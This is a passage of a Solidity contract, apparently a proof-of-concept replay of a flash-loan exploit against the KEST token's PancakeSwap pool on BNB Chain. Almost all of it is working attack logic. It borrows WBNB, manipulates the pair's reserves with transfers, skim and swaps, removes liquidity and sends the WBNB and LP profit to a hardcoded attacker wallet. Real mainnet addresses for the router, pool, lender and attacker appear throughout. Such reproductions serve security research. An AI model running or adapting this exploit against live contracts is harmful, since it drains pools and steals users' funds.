            uint256 kestPairAmount = 11450437048695215006667687957740;
            IERC20Like(Addresses.KEST).transfer(Addresses.Cake_LP, kestPairAmount);
        }
    }

    function _skimPair8() internal {
        ICake_LP(Addresses.Cake_LP).skim(Addresses.Cake_LP);
        ICake_LP(Addresses.Cake_LP).getReserves();
    }

    function _readPairKest8() internal {
        IERC20Like(Addresses.KEST).balanceOf(Addresses.Cake_LP);
    }

    function _quotePairSwap8() internal {
        IPancakeRouter(Addresses.PancakeRouter)
            .getAmountOut(10996999741566884492403647514615, 23064323920593664706469182235, 209461149979361592608);
    }

    function _swapPairToWbnb8() internal {
        {
            uint256 pairWbnbOut = 209021664115399799718;
            IUniswapV2PairLike(Addresses.Cake_LP).swap(0, pairWbnbOut, address(this), hex"");
        }
    }

    function _readWbnbBalance15() internal {
        IERC20Like(Addresses.WBNB).balanceOf(address(this));
    }

    function _buyExactKest8() internal {
        {
            uint256 exactKestInput = 209021664115399799718;
            if (exactKestInput != 0) {
                if (
                    IERC20Like(Addresses.WBNB).allowance(address(this), Addresses.PancakeRouter)
                        < exactKestInput
                ) {
                    IERC20Like(Addresses.WBNB).approve(Addresses.PancakeRouter, type(uint256).max);
                }
                IPancakeRouter(Addresses.PancakeRouter)
                    .swapTokensForExactTokens(
                        8587827786521411255000765968305,
                        exactKestInput,
                        _addressArray2(Addresses.WBNB, Addresses.KEST),
                        Addresses.PancakeRouter,
                        1702723254
                    );
            }
        }
    }

    function _removeKestLp8() internal {
        IPancakeRouter(Addresses.PancakeRouter)
            .removeLiquidityETHSupportingFeeOnTransferTokens(
                Addresses.KEST, 1000000000000000, 1, 1, address(this), 1702723254
            );
    }

    function _readKestBalance21() internal {
        IERC20Like(Addresses.KEST).balanceOf(address(this));
    }

    function _swapKestToWbnb8() internal {
        {
            uint256 swapAmountIn = 16495499614527659238235860306630;
            if (swapAmountIn != 0) {
                if (
                    IERC20Like(Addresses.KEST).allowance(address(this), Addresses.PancakeRouter)
                        < swapAmountIn
                ) {
                    IERC20Like(Addresses.KEST).approve(Addresses.PancakeRouter, type(uint256).max);
                }
                IPancakeRouter(Addresses.PancakeRouter)
                    .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                        swapAmountIn,
                        1,
                        _addressArray2(Addresses.KEST, Addresses.WBNB),
                        address(this),
                        1702723254
                    );
            }
        }
    }

    function _readLpBalance() internal {
        IERC20Like(Addresses.Cake_LP).balanceOf(address(this));
    }

    function _collectLpProfit() internal {
        {
            uint256 kestPairAmount = 2146320284844256899722;
            IERC20Like(Addresses.Cake_LP).transfer(Addresses.attacker_eoa, kestPairAmount);
        }
    }

    function _readWbnbBalance16() internal {
        IERC20Like(Addresses.WBNB).balanceOf(address(this));
    }

    function _collectWbnbProfit() internal {
        {
            uint256 wbnbProfitAmount = 9019657610212775442;
            IERC20Like(Addresses.WBNB).transfer(Addresses.attacker_eoa, wbnbProfitAmount);
        }
    }

    function _approveFlashRepay() internal {
        {
            uint256 repaymentAllowance = 200180000000000000000;
            IERC20Like(Addresses.WBNB)
                .approve(Addresses.InitializableImmutableAdminUpgradeabilityProxy_D50CF0, repaymentAllowance);
        }
    }

    function _borrowFlashLoan() internal {
        _requestFlashLoan();
    }

    function _requestFlashLoan() internal {
        IInitializableImmutableAdminUpgradeabilityProxy_D50CF0(
                Addresses.InitializableImmutableAdminUpgradeabilityProxy_D50CF0
            )
            .flashLoan(
                address(this),
                _addressArray1(Addresses.WBNB),
                _uintArray1(200000000000000000000),
                _uintArray1(0),
                address(this),
                hex"",
                uint16(0)
            );
    }

    receive() external payable {
        if ((address(this) == address(this)
                    && (msg.sender == Addresses.PancakeRouter || msg.sender == address(this)))) {
            _routerCallback();
        }
    }

    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    ) external payable returns (bool) {
        assets;
        amounts;
        premiums;
        initiator;
        params;
        if (!_callbackDone[FLASH_CALLBACK]) flashLoanCallback();
        bytes memory ret = hex"0000000000000000000000000000000000000000000000000000000000000001";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function BuyTokens(uint256 amount, uint256 amount1) external payable {
        amount;
        amount1;
        _borrowFlashLoan();
        return;
    }

    fallback() external payable {
        _routerCallback();
    }

    function _routerCallback() internal {
        if (
            address(this) == address(this)
                && (msg.sender == Addresses.PancakeRouter || msg.sender == address(this))
        ) _advanceRouterCb();
        return;
    }

    function _advanceRouterCb() internal {
        uint256 ordinal = _nextRouterCb(2);
        if (ordinal == 0) {
            return;
        }
        if (ordinal == 1) {
            return;
        }
        if (ordinal == 2) {
            return;
        }
        if (ordinal == 3) {
            return;
        }
        if (ordinal == 4) {
            return;
        }
        if (ordinal == 5) {
            return;
        }
        if (ordinal == 6) {
            return;
        }
        if (ordinal == 7) {
            return;
        }
    }

    bytes32 private constant FLASH_CALLBACK = keccak256("poc.poc.FLASH_CALLBACK");
    mapping(bytes32 => bool) private _callbackDone;

    mapping(uint256 => uint256) private _routerCbCursor;

    function _nextRouterCb(uint256 index) internal returns (uint256 ordinal) {
        ordinal = _routerCbCursor[index];
        _routerCbCursor[index] = ordinal + 1;
    }

    function _addressArray1(address a0) internal pure returns (address[] memory out) {
        out = new address[](1);
        out[0] = a0;
    }

    function _uintArray1(uint256 a0) internal pure returns (uint256[] memory out) {
        out = new uint256[](1);
        out[0] = a0;
    }

    function _addressArray2(address a0, address a1) internal pure returns (address[] memory out) {
        out = new address[](2);
        out[0] = a0;
        out[1] = a1;
    }
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant PancakeRouter = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address internal constant Cake_LP = 0x2D9fFa7ea5D1aAabA58e60168517b49F57E7f85b;
    address internal constant rWBNB = 0x58b0BB56CFDfc5192989461dD43568bcfB2797Db;
    address internal constant KEST = 0x7dda132dd57b773a94E27c5CAA97834A73510429;
    address internal constant DefaultReserveInterestRateStrategy = 0x8d34486B0a46086708CF047275E267db1eC40610;
    address internal constant attacker_eoa = 0x90c4C1aa895a086215765EC9639431309633B198;
    address internal constant Controller = 0xb520Ef70AA7480A30BfBbCed1976046E4BbAa2cD;
    address internal constant BalancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address internal constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address internal constant attack_contract = 0xC25979956D6f6AcFc3702C68DFf7a4d871Eee4aa;
    address internal constant TransparentUpgradeableProxy_CEBDFF = 0xcebdff400A23E5Ad1CDeB11AfdD0087d5E9dFed8;
    address internal constant InitializableImmutableAdminUpgradeabilityProxy_D50CF0 =
        0xd50Cf00b6e600Dd036Ba8eF475677d816d6c4281;
    address internal constant A_FFFFFF_FFFF = 0xFFfFfFffFFfffFFfFFfFFFFFffFFFffffFfFFFfF;
}

interface ICake_LP {
    function getReserves() external view;
    function mint(address) external returns (uint256);
    function skim(address) external;
}

interface IInitializableImmutableAdminUpgradeabilityProxy_D50CF0 {
    function flashLoan(
        address,
        address[] calldata,
        uint256[] calldata,
        uint256[] calldata,
        address,
        bytes calldata,
        uint16
    ) external;
}

interface IPancakeRouter {
    function getAmountOut(uint256, uint256, uint256) external view returns (uint256);
    function quote(uint256, uint256, uint256) external view returns (uint256);
    function removeLiquidityETHSupportingFeeOnTransferTokens(address, uint256, uint256, uint256, address, uint256)
        external
        returns (uint256);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256,
        uint256,
        address[] calldata,
        address,
        uint256
    ) external;
    function swapTokensForExactTokens(uint256, uint256, address[] calldata, address, uint256) external;
}

interface IUniswapV2PairLike {
    function swap(uint256, uint256, address, bytes calldata) external;
}
